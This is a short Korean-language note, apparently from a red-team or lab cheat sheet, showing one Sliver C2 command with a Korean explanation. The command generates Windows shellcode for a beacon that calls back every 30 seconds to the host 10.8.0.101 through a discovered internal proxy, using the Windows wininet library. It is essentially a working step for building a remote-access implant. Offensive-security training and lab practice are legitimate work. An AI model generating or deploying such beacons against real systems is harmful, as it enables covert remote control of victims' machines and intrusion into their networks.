# Sliver

### 비콘 생성

```bash
sliver > generate beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --http 10.8.0.101?proxy=http://172.16.21.50:8080,10.8.0.101?driver=wininet --name wutai-http --save /tmp/vl/http.bin -G --skip-symbols

#30초마다 호출, 발견한 프록시 서버를 통해 연결, go 라이브러리 대신 windows 라이브러리를 사용하여 연결
```
